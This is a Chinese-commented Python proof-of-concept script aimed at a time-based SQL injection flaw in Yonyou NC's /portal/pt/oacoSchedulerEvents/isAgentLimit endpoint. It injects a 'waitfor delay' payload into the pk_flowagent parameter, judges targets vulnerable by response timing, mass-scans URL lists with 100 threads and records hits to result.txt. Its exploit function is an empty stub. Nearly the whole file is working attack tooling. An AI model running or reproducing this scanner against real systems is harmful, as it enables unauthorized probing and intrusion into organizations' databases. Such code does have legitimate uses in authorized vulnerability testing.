#用友NC-oacoSchedulerEvents/isAgentLimit存在SQL注入漏洞
import requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="用友NC-oacoSchedulerEvents/isAgentLimit存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()

    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
def poc(target):
    payload_url = "/portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:3'--"
    url = target+payload_url
    headers={"Pragma": "no-cache", "Cache-Control": "no-cache", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "keep-alive"}
    proxies={
        'http':"http://127.0.0.1:8080",
        'https':"http://127.0.0.1:8080"
    }
    try:
        res = requests.get(url=url,headers=headers,verify=False,timeout=10)
        if res.elapsed.total_seconds() >=3 :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"该url不存在漏洞{target}")
    except :
        print(f"该url存在问题{target}")
        return False
def exp(target):

    pass

if __name__ == '__main__':
    main()